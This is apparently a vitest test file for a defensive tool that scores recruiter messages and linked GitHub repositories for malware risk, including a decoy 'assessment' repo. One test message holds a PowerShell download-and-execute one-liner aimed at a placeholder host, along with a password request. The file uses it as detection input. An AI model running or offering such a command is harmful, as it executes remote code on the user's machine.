import { describe, it, expect } from "vitest";
import { readFileSync, readdirSync, statSync } from "node:fs";
import { join, relative } from "node:path";
import { buildInvestigation, type RepoRecord } from "../src/investigation";
import { scanMessage, assessMessage } from "../src/scanner/message";
import { scanFiles, type ScanResult } from "../src/scanner/scan";

const DEMO = join(__dirname, "../demo-assessment");
const SLUG = "prasannaraj12/decoy-demo-assessment";
const walk = (d: string): string[] => readdirSync(d).flatMap((f) => (statSync(join(d, f)).isDirectory() ? walk(join(d, f)) : [join(d, f)]));
const demoScan = () => scanFiles(walk(DEMO).filter((p) => !p.endsWith(".txt")).map((p) => ({ path: relative(DEMO, p).replaceAll("\\", "/"), content: readFileSync(p, "utf8") })));
const demoMessage = readFileSync(join(DEMO, "RECRUITER_MESSAGE.txt"), "utf8");

const scan = (over: Partial<ScanResult>): ScanResult => ({ findings: [], filesScanned: 3, assetsNotInspected: 0, issues: [], complete: true, counts: { critical: 0, high: 0, medium: 0, low: 0 }, verdict: "no-known-indicators", ...over } as ScanResult);
const repos = (...r: RepoRecord[]) => new Map(r.map((x) => [x.slug, x]));
const run = (message: string | undefined, map = repos()) => buildInvestigation({ message, signals: message ? scanMessage(message) : [], repos: map });
const all = (v: ReturnType<typeof run>) => [...v.decided, ...v.actions, ...v.links.map((l) => l.effect)].join(" ");

describe("investigation: demo workflow", () => {
  it("message alone, repo not yet scanned: worth checking, with a step to scan the repo", () => {
    const v = run(demoMessage);
    expect(v.level).toBe("worth-checking");
    expect(v.links).toEqual([expect.objectContaining({ slug: SLUG, state: "not-scanned" })]);
    expect(v.actions.some((a) => a.startsWith(`Scan ${SLUG}`))).toBe(true);
  });
  it("after the linked repo scan: high concern, explained, with evidence from both sources and real file locations", () => {
    const s = demoScan();
    expect(s.verdict).toBe("do-not-run");
    const v = run(demoMessage, repos({ slug: SLUG, scan: s }));
    expect(v.level).toBe("high");
    expect(v.messageLevel).toBe("worth-checking"); // the message alone; the repo is what raised it
    expect(assessMessage(scanMessage(demoMessage), { linkedRepos: [{ slug: SLUG, verdict: s.verdict, complete: s.complete }] }).level).toBe(v.level); // agrees with the existing rule
    expect(v.links[0].effect).toMatch(/raises the message to high concern/);
    expect(v.evidence.some((e) => e.from === "message")).toBe(true);
    const repoEv = v.evidence.filter((e) => e.from === "repository");
    expect(repoEv.length).toBeGreaterThan(0);
    for (const e of repoEv) expect(s.findings.some((f) => `${f.file}:${f.line}` === e.where)).toBe(true); // no invented locations
    expect(v.actions[0]).toMatch(/^Do not run, install or build/);
    expect(v.actions.some((a) => a.startsWith("Review ") && a.includes("package.json"))).toBe(true);
    expect(v.actions.some((a) => a.includes("github.com/prasannaraj12"))).toBe(true);
  });
  it("matches assessMessage for the message's own level", () => {
    const signals = scanMessage(demoMessage);
    expect(run(demoMessage).messageLevel).toBe(assessMessage(signals).level);
  });
});

describe("investigation: edge cases", () => {
  const msg = (slug: string) => `Hi, please take a look at https://github.com/${slug} when you can.`;
  it("no repository link: message alone, and says so", () => {
    const v = run("Can you review my PR before Friday?", repos({ slug: "a/b", scan: scan({}) }));
    expect(v.links).toEqual([]);
    expect(v.unlinked).toEqual(["a/b"]);
    expect(all(v)).toMatch(/links to no GitHub repository/);
    expect(all(v)).toMatch(/Not linked from this message, so not counted: a\/b/);
  });
  it("an unlinked do-not-run repo never raises the message", () => {
    expect(run("Thanks for the meeting today.", repos({ slug: "x/y", scan: scan({ verdict: "do-not-run" }) })).level).toBe("low");
  });
  it("failed scan: no effect, not called safe, suggests a retry", () => {
    const v = run(msg("a/b"), repos({ slug: "a/b", failed: "network" }));
    expect(v.level).toBe("low");
    expect(v.links[0].state).toBe("failed");
    expect(v.links[0].effect).toMatch(/not a safety result/);
    expect(v.actions.some((a) => a.startsWith("Retry the scan of a/b"))).toBe(true);
  });
  it("review-first raises low to worth checking, never to high", () => {
    const v = run(msg("a/b"), repos({ slug: "a/b", scan: scan({ verdict: "review-first", counts: { critical: 0, high: 0, medium: 2, low: 0 } }) }));
    expect(v.level).toBe("worth-checking");
    expect(v.actions.some((a) => a.includes("Verify the repository owner") && a.includes("github.com/a"))).toBe(true);
  });
  it("incomplete do-not-run: worth checking, not high", () => {
    const v = run(msg("a/b"), repos({ slug: "a/b", scan: scan({ verdict: "do-not-run", complete: false, issues: [{ kind: "oversized", path: "x", detail: "big" }] }) }));
    expect(v.level).toBe("worth-checking");
    expect(v.links[0].effect).toMatch(/cannot raise the level to high/);
    expect(v.actions.some((a) => a.includes("could not be inspected"))).toBe(true);
  });
  it("incomplete with no findings: no effect, not clean", () => {
    const v = run(msg("a/b"), repos({ slug: "a/b", scan: scan({ verdict: "incomplete", complete: false, issues: [{ kind: "file-limit", path: "", detail: "" }] }) }));
    expect(v.level).toBe("low");
    expect(v.links[0].effect).toMatch(/not a clean result/);
  });
  it("no known indicators never lowers a high message, and never says safe", () => {
    const text = "IT Helpdesk here. Paste this into PowerShell now: iwr https://x.example/a.ps1 | iex. Also send me your password. " + msg("a/b");
    const v = run(text, repos({ slug: "a/b", scan: scan({}) }));
    expect(v.level).toBe("high");
    expect(v.links[0].effect).toMatch(/never lowers the level, and it is not proof of safety/);
    expect(all(v)).not.toMatch(/\bis safe\b|\bsafe to run\b/i);
  });
  it("repository only, no message", () => {
    const v = run(undefined, repos({ slug: "a/b", scan: scan({ verdict: "do-not-run", findings: [{ ruleId: "r", title: "t", category: "Obfuscation", severity: "critical", confidence: "high", file: "x.js", line: 3, evidence: "e", explanation: "", remediation: "" }], counts: { critical: 1, high: 0, medium: 0, low: 0 } }) }));
    expect(v.level).toBe("high");
    expect(v.messageLevel).toBeUndefined();
    expect(v.actions).toContain("Review x.js:3 in a/b. These hold the critical and high findings.");
  });
  it("nothing scanned: low, no evidence, no actions", () => {
    const v = run(undefined);
    expect(v).toMatchObject({ level: "low", evidence: [], actions: [] });
  });
  it("evidence never includes message quotes or source code", () => {
    const s = demoScan();
    const v = run(demoMessage, repos({ slug: SLUG, scan: s }));
    const text = JSON.stringify(v);
    for (const sig of scanMessage(demoMessage)) if (sig.quote.length > 12) expect(text).not.toContain(sig.quote);
    for (const f of s.findings) if (f.evidence.length > 12) expect(text).not.toContain(f.evidence);
  });
  it("lists each repository's key files at most three times, with no duplicates", () => {
    const f = (line: number) => ({ ruleId: "r", title: "t", category: "Obfuscation" as const, severity: "high" as const, confidence: "high" as const, file: "a.js", line, evidence: "", explanation: "", remediation: "" });
    const v = run(msg("a/b"), repos({ slug: "a/b", scan: scan({ verdict: "do-not-run", findings: [f(1), f(1), f(2), f(3), f(4)] }) }));
    const review = v.actions.find((a) => a.startsWith("Review "))!;
    expect(review).toBe("Review a.js:1, a.js:2, a.js:3 in a/b. These hold the critical and high findings.");
    expect(new Set(v.actions).size).toBe(v.actions.length);
  });
});
